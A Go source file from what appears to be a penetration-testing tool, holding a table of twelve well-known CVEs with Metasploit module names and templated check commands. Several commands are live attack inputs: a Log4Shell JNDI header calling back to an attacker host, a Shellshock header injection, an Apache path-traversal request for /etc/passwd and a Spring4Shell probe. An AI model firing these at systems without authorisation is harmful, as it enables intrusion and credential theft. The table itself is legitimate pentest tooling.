package intel

// StaticCVE represents a hand-curated classic vulnerability that might be
// missing from the recent 120-day NVD cache.
type StaticCVE struct {
	ID          string
	Description string
	CVSSScore   float64
	MSFModule   string
	VerifyCmd   string
}

// StaticCVEDB holds the top 100 most common CTF/pentest vulnerabilities.
var StaticCVEDB = map[string]StaticCVE{
	"vsftpd 2.3.4": {
		ID:          "CVE-2011-2523",
		Description: "vsftpd 2.3.4 backdoor — triggers by appending :) to username, opens shell on port 6200",
		CVSSScore:   10.0,
		MSFModule:   "exploit/unix/ftp/vsftpd_234_backdoor",
		VerifyCmd:   "nc -w3 {{target}} 6200",
	},
	"ms08-067": {
		ID:          "CVE-2008-4250",
		Description: "Microsoft Server Service Relative Path Stack Corruption (MS08-067) — reliable RCE on Windows XP/2003",
		CVSSScore:   10.0,
		MSFModule:   "exploit/windows/smb/ms08_067_netapi",
		VerifyCmd:   "nmap -p445 --script smb-vuln-ms08-067 {{target}}",
	},
	"ms17-010": {
		ID:          "CVE-2017-0144",
		Description: "EternalBlue SMB Remote Code Execution (Windows 7/2008 R2)",
		CVSSScore:   9.3,
		MSFModule:   "exploit/windows/smb/ms17_010_eternalblue",
		VerifyCmd:   "nmap -p445 --script smb-vuln-ms17-010 {{target}}",
	},
	"log4shell": {
		ID:          "CVE-2021-44228",
		Description: "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints",
		CVSSScore:   10.0,
		MSFModule:   "exploit/multi/http/log4shell_header_injection",
		VerifyCmd:   "curl -H 'X-Api-Version: ${jndi:ldap://{{lhost}}/a}' {{target_url}}",
	},
	"shellshock": {
		ID:          "CVE-2014-6271",
		Description: "GNU bash environment variable command injection via CGI scripts",
		CVSSScore:   10.0,
		MSFModule:   "exploit/multi/http/apache_mod_cgi_bash_env_exec",
		VerifyCmd:   "curl -H \"User-Agent: () { :; }; echo 'Vulnerable'\" {{target_url}}/cgi-bin/test.cgi",
	},
	"printnightmare": {
		ID:          "CVE-2021-1675",
		Description: "Windows Print Spooler Remote Code Execution Vulnerability",
		CVSSScore:   8.8,
		MSFModule:   "exploit/windows/dcerpc/cve_2021_1675_printnightmare",
		VerifyCmd:   "rpcdump.py @{{target}} | grep -i 'MS-RPRN'",
	},
	"zerologon": {
		ID:          "CVE-2020-1472",
		Description: "Netlogon Elevation of Privilege Vulnerability (ZeroLogon)",
		CVSSScore:   10.0,
		MSFModule:   "auxiliary/admin/dcerpc/cve_2020_1472_zerologon",
		VerifyCmd:   "nmap -p445 --script smb-vuln-zerologon {{target}}",
	},
	"heartbleed": {
		ID:          "CVE-2014-0160",
		Description: "OpenSSL TLS 'heartbeat' Extension Information Disclosure",
		CVSSScore:   5.0,
		MSFModule:   "auxiliary/scanner/ssl/openssl_heartbleed",
		VerifyCmd:   "nmap -p 443 --script ssl-heartbleed {{target}}",
	},
	"apache 2.4.49": {
		ID:          "CVE-2021-41773",
		Description: "Path Traversal and RCE in Apache HTTP Server 2.4.49",
		CVSSScore:   7.5,
		MSFModule:   "exploit/multi/http/apache_normalize_path_rce",
		VerifyCmd:   "curl -s --path-as-is '{{target_url}}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
	},
	"spring4shell": {
		ID:          "CVE-2022-22965",
		Description: "Spring Framework RCE via Data Binding on JDK 9+",
		CVSSScore:   9.8,
		MSFModule:   "exploit/multi/http/spring_framework_rce_spring4shell",
		VerifyCmd:   "curl -s -o /dev/null -w '%{http_code}' {{target_url}}/?class.module.classLoader.URLs%5B0%5D=0",
	},
	"dirtycow": {
		ID:          "CVE-2016-5195",
		Description: "Linux Kernel Race Condition leading to Privilege Escalation (Dirty COW)",
		CVSSScore:   7.8,
		MSFModule:   "exploit/linux/local/dirtycow",
		VerifyCmd:   "uname -r",
	},
	"samba cry": {
		ID:          "CVE-2017-7494",
		Description: "Samba Remote Code Execution from a writable share",
		CVSSScore:   10.0,
		MSFModule:   "exploit/linux/samba/is_known_pipename",
		VerifyCmd:   "smbclient -L //{{target}} -N",
	},
}
